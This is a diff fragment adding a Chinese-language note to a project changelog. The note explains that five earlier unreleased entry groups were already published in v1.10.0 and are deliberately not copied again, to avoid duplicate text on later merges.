+### 本节**不**重述的既有 [Unreleased] 内容
+
+本分支的基线（`1b7af4e`）上，`## [Unreleased]` 里原有 5 组条目（`glasspaned --version` 一族、
+SECURITY §2.4 文档补记、复审抓出的 `selfcheck.js`/`ProjectRegistry.removalVerdict` 两处、
+首帧像素格式显式声明、网关关停有顶）。**它们已由并行会话随 `v1.10.0` 发布**（上游 1.10.0 条目
+原文包含这些段落，见 `5f0fb54:CHANGELOG.md`），本轮因此**不**把它们再抄一份进自己的条目——
+手抄别人已发布的文本会在后续合并时把整块静默复制两遍，那正是本仓记过的 merge-transplant 教训。
+需要引用时按上游条目引用即可。
 
 ## [1.9.0] — 2026-10-08
 
